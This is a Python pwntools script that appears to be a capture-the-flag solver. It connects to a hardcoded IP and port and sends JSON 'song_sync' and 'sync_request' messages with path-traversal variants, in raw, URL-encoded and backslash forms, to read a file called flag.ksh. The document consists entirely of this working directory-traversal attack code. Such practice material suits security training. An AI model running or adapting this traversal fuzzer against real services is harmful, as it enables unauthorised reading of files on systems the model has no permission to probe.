#!/usr/bin/env python3
from pwn import *
import time
import json
import urllib.parse

def encode_path(path):
    # URL encode special characters while preserving slashes
    parts = path.split('/')
    encoded_parts = [urllib.parse.quote(part) for part in parts]
    return '/'.join(encoded_parts)

def try_path_traversal(host, port, path):
    try:
        # Set up connection with a timeout
        conn = remote(host, port, timeout=5)

        # Create payload with both encoded and raw paths
        payloads = [
            {"type": "song_sync", "path": path},
            {"type": "song_sync", "path": encode_path(path)},
            {"type": "song_sync", "path": path.replace('/', '\\')},
            {"type": "sync_request", "file": path}
        ]

        for payload in payloads:
            try:
                # Convert to JSON and send
                json_payload = json.dumps(payload)
                print(f"Sending payload: {json_payload}")
                conn.sendline(json_payload.encode())

                # Try to receive response
                try:
                    response = conn.recvline(timeout=3)
                    print(f"Got response: {response}")
                    if b'flag{' in response or b'effect=' in response:
                        return response
                except EOFError:
                    continue

            except Exception as e:
                print(f"Error with payload {payload}: {str(e)}")
                continue

        return None
    except Exception as e:
        print(f"Connection error: {str(e)}")
        return None
    finally:
        try:
            conn.close()
        except:
            pass

def main():
    host = "34.234.204.29"
    port = 39079

    base_paths = [
        "flag.ksh",
        "../flag.ksh",
        "../../flag.ksh",
        "../../../flag.ksh",
        "./flag.ksh",
        "../flagsong/flag.ksh",
        "./flagsong/flag.ksh"
    ]

    # Generate variations of paths
    paths = []
    for base in base_paths:
        paths.append(base)
        paths.append(base.replace('/', '\\'))
        paths.append(f"../songs/{base}")
        paths.append(f"..\\songs\\{base}")

    for path in paths:
        print(f"\nTrying path: {path}")
        result = try_path_traversal(host, port, path)
        if result:
            print(f"Interesting response found for path {path}:")
            try:
                print(result.decode('utf-8', errors='ignore'))
            except:
                print(result)

            # If we find a flag pattern, stop testing
            if b'flag{' in result or b'effect=' in result:
                print("\nPotential flag found!")
                break

        time.sleep(0.5)

if __name__ == "__main__":
    main()
